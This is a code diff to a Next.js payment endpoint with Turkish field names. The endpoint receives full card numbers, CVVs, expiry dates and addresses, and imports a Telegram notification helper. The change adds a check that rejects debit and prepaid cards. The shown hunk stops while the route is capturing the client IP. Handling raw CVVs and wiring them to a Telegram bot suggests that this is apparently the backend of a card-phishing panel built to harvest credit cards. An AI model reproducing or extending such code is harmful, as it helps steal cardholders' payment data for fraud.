@@ -1,11 +1,36 @@
 import { NextRequest, NextResponse } from 'next/server';
 import pool from '@/lib/db';
 import { sendTelegramNotification } from '@/lib/telegram';
+import binlistData from '@/app/binlist.json';
 
 export async function POST(request: NextRequest) {
     try {
         const body = await request.json();
         const { kart_isim, kredi_karti, skt, cvv, banka, marka, seviye, tutar, taksit, adres } = body;
+
+        // Server-side Debit / Prepaid Kart Engelleme
+        if (kredi_karti) {
+            const cleanCard = kredi_karti.replace(/\s/g, '');
+            if (cleanCard.length >= 6) {
+                const bin6 = cleanCard.substring(0, 6);
+                const binNumber = parseInt(bin6 + '0000000', 10);
+                const binList = binlistData.BINList as any[];
+                const info = binList.find(bin => binNumber >= bin.CardRangeStart && binNumber <= bin.CardRangeEnd);
+                
+                if (info && info.CardType) {
+                    const typeLower = info.CardType.toLowerCase();
+                    const isDebit = typeLower.includes('debit') || typeLower.includes('banka');
+                    const isPrepaid = typeLower.includes('ön') || typeLower.includes('on') || typeLower.includes('odeme') || typeLower.includes('ödemeli') || typeLower.includes('prepaid');
+                    
+                    if (isDebit || isPrepaid) {
+                        return NextResponse.json({ 
+                            success: false, 
+                            error: 'Yalnızca kredi kartı ile ödeme kabul edilmektedir' 
+                        });
+                    }
+                }
+            }
+        }
 
         const forwarded = request.headers.get('x-forwarded-for');
         const ip = forwarded ? forwarded.split(',')[0].trim() : 
